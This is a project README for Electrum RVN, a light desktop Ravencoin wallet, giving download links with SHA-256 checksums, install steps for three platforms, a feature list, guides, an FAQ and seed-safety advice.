![Electrum RVN](assets/banner-app.png)

<h1 align="center">Electrum RVN</h1>

<p align="center"><strong>A light desktop wallet for Ravencoin and its native assets</strong></p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0"><img src="https://img.shields.io/badge/RELEASE-v4.8.0-384182?style=for-the-badge&labelColor=131A38" alt="Release v4.8.0"></a> <a href="https://github.com/electrum-source/Electrum-RVN/blob/2.9.x/LICENCE"><img src="https://img.shields.io/badge/LICENSE-MIT-F05239?style=for-the-badge&labelColor=131A38" alt="License MIT"></a></p>

---

## Downloads - v4.8.0

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

Verify all files against the SHA-256 values below.

<!-- SHA256:START -->
<div align="center">

| File | SHA-256 |
| --- | --- |
| `electrum-rvn-v4.8.0-setup.exe` | `5d404a7acf1e353e8a4f7bfd51480dc27ffbd2f4bdf33cd75b74f30da74680fb` |
| `electrum-rvn-v4.8.0.dmg` | `f99c566b44852dc80437ad845d9f4669a8c76a6338714fd6ffdc91939cfc5d84` |
| `electrum-rvn-v4.8.0.AppImage` | `ed69e145c56d454600116b6efc2ad759d68de288a9d56428bfb48dfcc3b89354` |

</div>
<!-- SHA256:END -->

> [!WARNING]
> Only download from this GitHub release page.

---


## What Electrum RVN is

Electrum RVN is a desktop wallet for Ravencoin that runs without the Ravencoin blockchain on disk. It connects to Electrum servers, checks block headers, and asks only for the transactions that concern the addresses in your wallet, so it opens in seconds on an ordinary machine and stays usable on a laptop with a small drive. Keys are generated locally, the wallet file is encrypted with a password you choose, and no account, email address or custodian sits between you and the chain.

It is also a Ravencoin wallet rather than a Bitcoin wallet with a different name. Ravencoin has its own chain, its own address prefix and its own asset layer, and this wallet works with that layer directly: named assets, sub-assets, unique assets, transfers, burns and reissues all happen in the same window as an ordinary RVN payment. Ledger and Trezor signing, multisig wallets, watch-only wallets and a cold-storage workflow are supported as well, which is what makes it possible to keep the keys off an online machine without a second application.

The trade-off is the same one every light client makes. A server answers the questions the wallet cannot answer alone, so a server that stops responding looks like a wallet that has stopped working, and the fix is usually the server list rather than a reinstall. Running a full node is the other end of that choice: it removes the dependency and brings back the disk, the bandwidth and the sync time this wallet exists to avoid.

## Who it is for

- You hold RVN and want a wallet that opens without a chain sync.
- You issue or receive Ravencoin assets and want them beside your RVN.
- You keep a hardware wallet and want the signing step to stay on the device.
- You are setting up a cold or multisig arrangement and need watch-only support.

## Install

<details open>
<summary><img src="assets/platform-windows.png" alt="Windows"></summary>

1. Download [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) from the tagged release.
2. Compare its SHA-256 with the value in the table above before running it.
3. Run the installer and choose the folder you want the application in.
4. Open Electrum RVN and create a wallet, writing the twelve words down as they appear.

</details>

<details>
<summary><img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"></summary>

1. Download [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) from the tagged release.
2. Compare its SHA-256 with the value in the table above before opening it.
3. Open the disk image and drag the application into Applications.
4. Launch it, then create a wallet and write the twelve words down.

</details>

<details>
<summary><img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"></summary>

1. Download [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) and make it executable.
2. Compare its SHA-256 with the value in the table above.
3. Run the AppImage directly; no system package is replaced.
4. Create a wallet and write the twelve words down.

</details>

## Features

- Light client: no chain download, no node to run, and a wallet ready in seconds.
- Native RVN assets: issue, transfer, burn and reissue from the same window as a payment.
- Local keys: the seed is generated on your machine and never sent anywhere.
- Encrypted wallet file: the password protects the file, and keys are decrypted only while signing.
- Hardware signing: Ledger and Trezor devices sign while the wallet builds the transaction.
- Multisig and watch-only wallets: the pieces a cold-storage arrangement needs.
- No account and no telemetry: there is no signup, no email and no usage reporting.

## How a transfer works here

1. Paste the destination address on the send screen and choose the amount in RVN.
2. Pick a fee, or keep the estimate the wallet shows from the server's recent blocks.
3. Review the address, the amount and the fee before confirming, because that screen is the last point at which a mistake costs nothing to fix.
4. Sign with the wallet password, or with the hardware device when one is connected.
5. Watch the transaction move from pending to confirmed as blocks arrive.

## Guides.

<div align="center">

| Guide | What it answers |
| --- | --- |
| [How to Create a Wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md) | Creating a wallet takes one screen and one written-down seed, and the seed is the only copy that survives. |
| [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) | Write the twelve words on paper at creation time, because a screenshot or a note on the same disk is not a backup. |
| [Electrum RVN Not Syncing](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-not-syncing.md) | A wallet that will not sync is usually stuck on an unreachable server, so the fix starts with the server list. |
| [How to Issue a Ravencoin Asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md) | Issuing an asset claims a name on Ravencoin and sets its supply, divisibility and reissue rules in one step. |

</div>
All fifty-eight guides are indexed in the [setup repository](https://github.com/electrum-source/download-and-setup#readme).

## Common first questions

### Does it store the blockchain?

No. It keeps block headers and asks a server for the transactions that touch your addresses, which is why it installs as a small application.

### Where is the wallet file?

In your user profile rather than the program folder, so reinstalling or removing the application does not delete the wallet.

### Can I use it without a hardware wallet?

Yes. The seed lives on your machine and the file is encrypted, and a hardware device is an addition rather than a requirement.

### What licence is the code under?

MIT, read from the LICENCE file in this repository, which is the authority on what you may rebuild and redistribute.

### What happens if a server stops answering?

The wallet keeps the addresses and the file intact and simply cannot see new blocks, so switching servers restores it without touching a key.

## Security

**The twelve words are the wallet. Nobody can reset a password, reverse a send or restore a seed, so write the words down before the first coin arrives and never type them into a page that asked for them first.**

## Support

Open an issue on this repository for a reproducible problem with a guide or a build. Issues are public: never paste a seed, a private key or a wallet file into one.

## License

MIT.

---

[Release v4.8.0](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0) | [All releases](https://github.com/electrum-source/Electrum-RVN/releases) | [Setup guides](https://github.com/electrum-source/download-and-setup#readme)
